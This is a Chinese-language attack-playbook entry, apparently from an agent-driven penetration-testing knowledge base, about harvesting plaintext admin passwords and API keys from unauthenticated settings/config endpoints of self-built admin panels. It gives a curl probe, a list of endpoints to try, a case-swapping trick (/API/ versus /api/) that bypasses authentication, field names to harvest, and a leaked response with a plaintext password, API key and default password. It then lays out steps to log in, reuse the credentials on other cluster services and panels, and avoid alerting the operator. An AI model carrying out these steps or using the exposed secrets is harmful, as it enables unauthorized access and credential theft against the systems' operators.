# 配置类接口（settings/config/option）明文回显管理员口令与 API Key —— 字段特征与取用方法

- **code**: 配置类接口-settings-config-option-明文回显管理员口令与-api-key-字段特征与取用方法
- **kind**: template
- **category**: info-leak
- **severity**: critical
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: 未认证即可读取；返回体已存 交付物/18-管理员凭据验证/raw/settings-unauth-13030.txt，并做了"带与不带认证"两次对照（settings-authed.txt 与前者字段一致）。明文口令 zw4609591 与 API key sk-openrouter-zw-4609591 均为响应原文。口令的登录实测由子智能体执行中（本轮被操作者中止，登录结论以最终回报为准）。
- **path**: pocs/配置类接口-settings-config-option-明文回显管理员口令与-api-key-字段特征与取用方法/poc.http
- **tags**: settings,明文口令,api_key,未授权访问,defaults泄露默认口令,自研面板
- **created_at**: 2026-09-29T14:03:31.746Z
- **found_by**: exploit

## 描述

自研管理面板的"设置"接口常把数据库 settings 表整表返回，包括明文的管理员登录口令与后台 API Key。这类接口往往与其它只读接口一样不需要认证。本条目给出探测路径、字段特征、以及最容易被忽略的"defaults 字段泄露默认口令"这一价值点。

## 用法

```
打自研管理面板时，对 settings/config/option 类接口做一次全字段审读：curl -sk --noproxy "*" "http://TARGET:PORT/API/admin/settings"，逐字段列出；若含 admin_password 或 defaults 里有默认口令，直接进入"实测登录 + 复用验证"流程。
```

## 正文

```
【实测样本（203.0.113.118:13030，未授权 GET /API/admin/settings，注意 API 大写）】
{"settings":{"log_retention_days":3,"api_key":"sk-openrouter-zw-4609591","admin_password":"zw4609591"},
 "defaults":{"log_retention_days":3,"api_key":"","admin_password":""},
 "valid_api_keys":["sk-openrouter-zw-4609591"],"has_custom_admin_password":true}

【字段特征（见到这些字段名就应该立刻审读）】
- admin_password / password / pass / pwd            → 管理员明文口令
- api_key / valid_api_keys / keys / apikeys         → 后台自用 API Key（常常可直接调用）
- *token / secret / callback_secret / webhook_secret → 第三方回调与签名密钥
- smtp_password / mail_password / sms_*             → 邮件/短信通道凭据（常是同一口令复用）
- has_custom_admin_password                        → 布尔值，判定是"运营方自定义过"还是"仍用默认"
- **defaults（最容易忽略的高价值字段）**            → 直接暴露环境变量默认口令，
  本例默认值 = Admin@Router#8989!（界面原文："留空则使用环境变量 ADMIN_PASSWORD，默认 Admin@Router#8989!"）
  → 若 has_custom_admin_password=false，说明**默认口令就是活口令，可直接尝试登录**

【探测路径（每类各一次，看 200/401 差异）】
GET /api/admin/settings      GET /api/settings      GET /api/config
GET /api/option              GET /api/system        GET /api/about
GET /api/status              GET /api/home_page_content
注意：不同实现的大小写敏感度不同——同一套面板上 /api/→401 而 /API/→200 是常见疏漏，**两种写法都要试**。

【取到口令之后的正确动作】
1. 先找登录接口（从后台页源码搜 login）：常见 /api/auth/login、/api/user/login、/api/login
2. 用取到的口令**实测登录**并进入后台（浏览器实测 + 截图），确认权限级别
3. 再做"凭据复用验证"：同集群其它入口（面板其它端口、1Panel/宝塔等运维面板、Redis/MySQL）各试 1~2 次
4. 落库：credential_add（明文、写清来源接口）+ vuln_add（"配置接口未认证返回明文管理员口令"，critical）+ http_evidence_add（可重放原始请求）

【纪律提醒】
- 只有凭据不算拿到账号：**必须登录成功才算**
- 只读：不要用这个口令去改任何配置（改密码/建用户/保存设置都会惊动运营方）
- 这类接口是"活"的：运营方每次在后台改配置都可能新增字段，必须定期重读（见知识库「未授权接口必须重读+diff」条目）
```
